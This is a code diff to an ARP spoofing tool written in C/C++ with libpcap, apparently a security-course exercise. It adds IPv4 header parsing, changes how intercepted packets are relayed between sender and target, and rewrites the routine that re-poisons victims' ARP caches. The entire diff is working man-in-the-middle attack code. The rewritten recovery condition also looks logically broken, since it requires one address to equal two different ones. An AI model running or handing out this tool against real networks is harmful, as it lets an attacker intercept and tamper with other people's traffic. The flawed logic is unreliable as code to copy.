@@ -23,6 +23,19 @@ struct Args {
 	int cnt;
 };
 
+typedef struct{
+	uint8_t v_N_len;
+	uint8_t tos;
+	uint16_t t_Len;
+	uint16_t id;
+	uint16_t frag_Off;
+	uint8_t ttl;
+	uint8_t protocol;
+	uint16_t hd_Chksum;
+	uint32_t src_Addr;
+	uint32_t dst_Addr;
+}ip_header;
+
 void usage() {
 	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
 	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
@@ -92,32 +105,30 @@ int arp_cache_poisoning(pcap_t* handle, EthArpPacket *packet, Mac sm, Ip si, Mac
 
 int check_arp_recover(pcap_t* handle, EthArpPacket *packet , Mac *sm, Ip *si, Mac *tm, Ip *ti, Mac mm, int cnt) {
 	for(int i=0; i<=cnt; i++) {
-		if((ntohl(packet->arp_.tip_) != si[i]) && (ntohl(packet->arp_.tip_) != ti[i])) continue;	
-		
-		for(int j=0; j<5; j++) {
-			if(!(arp_cache_poisoning(handle, packet, sm[i], si[i], tm[i], ti[i], mm))) return 0;
+		if((ntohl(packet->arp_.tip_) == si[i]) && (ntohl(packet->arp_.tip_) == ti[i]) || (ntohl(packet->arp_.tip_) == ti[i]) && (ntohl(packet->arp_.tip_) == si[i])) {
+			
+			for(int j=0; j<5; j++) {
+				if(!(arp_cache_poisoning(handle, packet, sm[i], si[i], tm[i], ti[i], mm))) return 0;
+			}
 		}
 	}
 	return 1;
 }
 
-int relay_packet(pcap_t* handle, pcap_pkthdr* header, EthArpPacket *packet , Mac *sm, Ip *si, Mac *tm, Ip *ti, Mac mm, int cnt) {	
+int relay_packet(pcap_t* handle, pcap_pkthdr* header, EthArpPacket *packet , Mac *sm, Ip *si, Mac *tm, Ip *ti, Mac mm, Ip mi, int cnt) {	
 	for(int i=0; i<=cnt; i++) {
-		if((packet->eth_.smac_ == tm[i]) &&  (ntohl(*((uint32_t *)((uint8_t *)packet + 30))) == si[i])) {
-			packet->eth_.dmac_ = sm[i];
-			packet->eth_.smac_ = mm;
-		}
-		else if(packet->eth_.smac_ == sm[i]) {
+		ip_header *IpHdr =  (ip_header *)((uint8_t *)packet + sizeof(EthHdr));
+		if(((ntohl(IpHdr->src_Addr) == si[i]) && (ntohl(IpHdr->dst_Addr) != mi)) || ((ntohl(IpHdr->src_Addr) != si[i]) && (ntohl(IpHdr->dst_Addr) == ti[i]))) {
 			packet->eth_.dmac_ = tm[i];
 			packet->eth_.smac_ = mm;
 		}
 		else continue;
-		if(!(send_packet(handle, packet, header->caplen))) return 0;
+		if(!(send_packet(handle, packet, sizeof(EthHdr) + ntohs(IpHdr->t_Len)))) return 0;
 	}
 	return 1;
 }
 
-int arp_spoofing(pcap_t* handle, Mac *sm, Ip *si, Mac *tm, Ip *ti, Mac mm, int cnt) {
+int arp_spoofing(pcap_t* handle, Mac *sm, Ip *si, Mac *tm, Ip *ti, Mac mm, Ip mi, int cnt) {
 	struct pcap_pkthdr* header;
 	const u_char* pkt;
 	while(1) {
@@ -131,8 +142,8 @@ int arp_spoofing(pcap_t* handle, Mac *sm, Ip *si, Mac *tm, Ip *ti, Mac mm, int c
 		if(ntohs(packet->eth_.type_) == EthHdr::Arp) {
 			return check_arp_recover(handle, packet, sm, si, tm, ti, mm, cnt);
 		}
-		else if(packet->eth_.dmac_ == mm){
-			return relay_packet(handle, header, packet, sm, si, tm, ti, mm, cnt);
+		else if(packet->eth_.dmac_ == mm && (ntohs(packet->eth_.type_) == EthHdr::Ip4)){
+			return relay_packet(handle, header, packet, sm, si, tm, ti, mm, mi, cnt);
 		}
 	}
 }
@@ -245,7 +256,7 @@ int main(int argc, char* argv[]) {
 	if(!(pthread_create(&thread, NULL, send_arp_with_interval, (void *)(&args)))) {
 		printf("\nARP SPOOFING IS ACTIVATED ...\n");
 		while(1) {
-			if(arp_spoofing(handle, sender_mac, sender_ip, target_mac, target_ip, my_mac, cnt)) continue;
+			if(arp_spoofing(handle, sender_mac, sender_ip, target_mac, target_ip, my_mac, my_ip, cnt)) continue;
 			printf("ERROR OCCURED\n");
 			break;
 		}
